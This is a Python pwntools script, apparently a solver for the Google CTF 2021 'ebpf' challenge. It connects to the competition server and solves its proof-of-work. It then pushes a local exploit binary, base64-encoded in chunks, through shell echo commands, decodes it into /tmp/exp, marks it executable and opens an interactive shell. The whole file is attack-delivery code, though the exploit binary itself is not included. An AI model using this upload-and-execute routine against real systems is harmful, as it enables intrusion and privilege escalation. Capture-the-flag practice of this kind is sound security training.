#!/usr/bin/env python3
from pwn import *
import base64
import os
import secrets
import socket
import sys
import hashlib
import gmpy2
context.log_level = 0

HAVE_GMP = True
VERSION = 's'
MODULUS = 2**1279-1
CHALSIZE = 2**128

SOLVER_URL = 'https://goo.gle/kctf-pow'

def python_sloth_root(x, diff, p):
    exponent = (p + 1) // 4
    for i in range(diff):
        x = pow(x, exponent, p) ^ 1
    return x

def python_sloth_square(y, diff, p):
    for i in range(diff):
        y = pow(y ^ 1, 2, p)
    return y

def gmpy_sloth_root(x, diff, p):
    exponent = (p + 1) // 4
    for i in range(diff):
        x = gmpy2.powmod(x, exponent, p).bit_flip(0)
    return int(x)

def gmpy_sloth_square(y, diff, p):
    y = gmpy2.mpz(y)
    for i in range(diff):
        y = gmpy2.powmod(y.bit_flip(0), 2, p)
    return int(y)

def sloth_root(x, diff, p):
    if HAVE_GMP:
        return gmpy_sloth_root(x, diff, p)
    else:
        return python_sloth_root(x, diff, p)

def sloth_square(x, diff, p):
    if HAVE_GMP:
        return gmpy_sloth_square(x, diff, p)
    else:
        return python_sloth_square(x, diff, p)

def encode_number(num):
    size = (num.bit_length() // 24) * 3 + 3
    return str(base64.b64encode(num.to_bytes(size, 'big')), 'utf-8')

def decode_number(enc):
    return int.from_bytes(base64.b64decode(bytes(enc, 'utf-8')), 'big')

def decode_challenge(enc):
    dec = enc.split('.')
    if dec[0] != VERSION:
        raise Exception('Unknown challenge version')
    return list(map(decode_number, dec[1:]))

def encode_challenge(arr):
    return '.'.join([VERSION] + list(map(encode_number, arr)))

def get_challenge(diff):
    x = secrets.randbelow(CHALSIZE)
    return encode_challenge([diff, x])

def solve_challenge(chal):
    [diff, x] = decode_challenge(chal)
    y = sloth_root(x, diff, MODULUS)
    return encode_challenge([y])

def can_bypass(chal, sol):
    from ecdsa import VerifyingKey
    from ecdsa.util import sigdecode_der
    if not sol.startswith('b.'):
        return False
    sig = bytes.fromhex(sol[2:])
    with open("/kctf/pow-bypass/pow-bypass-key-pub.pem", "r") as fd:
        vk = VerifyingKey.from_pem(fd.read())
    return vk.verify(signature=sig, data=bytes(chal, 'ascii'), hashfunc=hashlib.sha256, sigdecode=sigdecode_der)

def verify_challenge(chal, sol, allow_bypass=True):
    if allow_bypass and can_bypass(chal, sol):
        return True
    [diff, x] = decode_challenge(chal)
    [y] = decode_challenge(sol)
    res = sloth_square(y, diff, MODULUS)
    return (x == res) or (MODULUS - x == res)

PROMPT = '$ '

def upload():
    r.recvuntil(PROMPT)
    p = log.progress("Upload")

    with open('exp/exploit', "rb") as f:
        data = f.read()

    encoded = base64.b64encode(data).decode('ascii')

    for i in range(0, len(encoded), 300):
        p.status("%d / %d" % (i, len(encoded)))
        r.sendline("echo %s >> /tmp/benc" % (encoded[i:i+300]))
        r.recvuntil(PROMPT)

    r.sendline("cat /tmp/benc | base64 -d > /tmp/exp")
    r.recvuntil(PROMPT)
    r.sendline("chmod +x /tmp/exp")
    r.recvuntil(PROMPT)
    p.success()

def exploit(r):
    log.info("Booting")
    upload()
    r.interactive()

if __name__ == "__main__":
    r = remote('ebpf.2021.ctfcompetition.com', 1337)
    r.recvuntil('https://goo.gle/kctf-pow) solve ')
    challenge = r.recvline()[:-1].decode('ascii')
    solution = solve_challenge(challenge)

    if verify_challenge(challenge, solution, False):
        r.sendlineafter('? ', solution)
        exploit(r)
